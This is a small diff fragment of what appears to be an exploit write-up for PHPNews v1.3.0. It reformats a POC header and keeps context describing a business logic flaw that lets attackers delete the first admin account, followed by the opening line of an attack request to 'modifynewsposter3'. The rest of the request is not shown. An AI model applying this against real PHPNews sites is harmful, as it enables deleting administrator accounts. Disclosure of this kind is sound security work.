@@ -7,7 +7,7 @@
 ## Exploit Description:
 ## PHPNews v1.3.0 suffers from BLE - Business Logic Error Vulnerability allowing attackers to delete the first admin account
 
-## -----------------------------------------------POC-------------------------------------------------------------------
+## ---------------------------------POC-----------------------------
 ```
 POST /index.php?action=modifynewsposter3 HTTP/1.1
 ...
